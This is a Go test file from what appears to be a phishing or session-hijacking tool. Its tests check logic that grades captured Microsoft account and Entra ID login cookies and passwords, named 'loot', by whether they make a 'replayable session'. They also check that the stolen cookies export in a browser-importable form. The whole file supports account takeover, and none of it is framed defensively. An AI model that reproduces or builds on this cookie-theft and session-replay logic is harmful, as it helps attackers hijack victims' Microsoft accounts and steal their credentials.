package main

import (
	"strings"
	"testing"
)

func sess(tokens map[string]map[string]*CookieToken, password string) Session {
	return Session{CookieTokens: tokens, Password: password}
}

func tok(v string) *CookieToken { return &CookieToken{Name: "", Value: v, Path: "/"} }

func TestInspectLoot_PasswordlessMSA(t *testing.T) {
	s := sess(map[string]map[string]*CookieToken{
		"login.live.com": {
			"__Host-MSAAUTHP": tok("0.AXwVeryLongRealTokenValueHere"),
			"__Host-MSAAUTH":  tok("11"),
		},
	}, "")
	got := s.inspectLoot()
	if !got.Valid {
		t.Fatalf("passwordless MSA with MSAUTHP should be valid, got %+v", got)
	}
	if got.Kind != "msa" {
		t.Fatalf("kind=%q want msa", got.Kind)
	}
	if got.Token != "__Host-MSAAUTHP" {
		t.Fatalf("token=%q want __Host-MSAAUTHP", got.Token)
	}
	if !got.Persistent {
		t.Fatal("MSAAUTHP should be persistent")
	}
}

func TestInspectLoot_StubMSAAUTHIsNotASession(t *testing.T) {
	s := sess(map[string]map[string]*CookieToken{
		"login.live.com": {"__Host-MSAAUTH": tok("11")},
	}, "")
	got := s.inspectLoot()
	if got.Valid {
		t.Fatalf("MSAAUTH=11 is a deleted stub, should not be valid: %+v", got)
	}
}

func TestInspectLoot_EntraPersistent(t *testing.T) {
	s := sess(map[string]map[string]*CookieToken{
		"login.microsoftonline.com": {
			"ESTSAUTH":            tok("eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs"),
			"ESTSAUTHPERSISTENT":  tok("eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsXX"),
			"SignInStateCookie":   tok("0.AaaaLongState"),
		},
	}, "hunter2")
	got := s.inspectLoot()
	if !got.Valid || got.Kind != "entra" || !got.Persistent {
		t.Fatalf("entra persistent: %+v", got)
	}
	if got.Token != "ESTSAUTHPERSISTENT" {
		t.Fatalf("token=%q", got.Token)
	}
}

func TestInspectLoot_JunkEntra(t *testing.T) {
	s := sess(map[string]map[string]*CookieToken{
		"login.microsoftonline.com": {
			"ESTSAUTH": tok("Disabled"),
			"estsfd":   tok("estsfd"),
		},
	}, "")
	if s.hasValidSession() {
		t.Fatal("Disabled ESTSAUTH must not count as a session")
	}
}

func TestInspectLoot_PasswordWithoutTokenIsNotValid(t *testing.T) {
	s := sess(map[string]map[string]*CookieToken{
		"login.microsoftonline.com": {"esctx": tok("context-blob-not-a-session")},
	}, "hunter2")
	got := s.inspectLoot()
	if got.Valid {
		t.Fatalf("password + junk cookies is not a replayable session: %+v", got)
	}
}

func TestInspectLoot_PasswordMSA(t *testing.T) {
	s := sess(map[string]map[string]*CookieToken{
		"login.live.com": {"__Host-MSAAUTH": tok("P.AyAVeryLongAuthCookieValue")},
	}, "hunter2")
	got := s.inspectLoot()
	if !got.Valid || got.Kind != "msa" || got.Persistent {
		t.Fatalf("password MSA: %+v", got)
	}
}

func TestExportHostCookies(t *testing.T) {
	s := sess(map[string]map[string]*CookieToken{
		".login.live.com": {"__Host-MSAAUTHP": {Value: "abc", Path: "/foo", HttpOnly: true}},
	}, "")
	out := s.exportCookies()
	if len(out) != 1 {
		t.Fatalf("len=%d", len(out))
	}
	c := out[0]
	if !c.HostOnly || !c.Secure || c.Path != "/" || c.Domain != "login.live.com" {
		t.Fatalf("host cookie export: %+v", c)
	}
	if c.SameSite != "no_restriction" {
		t.Fatalf("sameSite=%q", c.SameSite)
	}
}

func TestMSCookieNameFold(t *testing.T) {
	if g := strings.ToLower("__Host-MSAAUTHP"); g != "__host-msaauthp" {
		t.Fatalf("MSAAUTHP fold=%q", g)
	}
	if g := strings.ToLower("__Host-MSAAUTH"); g != "__host-msaauth" {
		t.Fatalf("MSAAUTH fold=%q", g)
	}
}

func TestIsJunkCookieValue(t *testing.T) {
	for _, v := range []string{"", "Disabled", "estsfd", "11", "x"} {
		if !isJunkCookieValue(v) {
			t.Errorf("%q should be junk", v)
		}
	}
	if isJunkCookieValue("0.AX-real-token") {
		t.Error("real token flagged as junk")
	}
}

func TestExportSortedByDomainThenName(t *testing.T) {
	s := sess(map[string]map[string]*CookieToken{
		"b.example": {"z": tok("1"), "a": tok("1")},
		"a.example": {"m": tok("1")},
	}, "")
	out := s.exportCookies()
	var keys []string
	for _, c := range out {
		keys = append(keys, c.Domain+"/"+c.Name)
	}
	joined := strings.Join(keys, ",")
	if joined != "a.example/m,b.example/a,b.example/z" {
		t.Fatalf("order=%s", joined)
	}
}
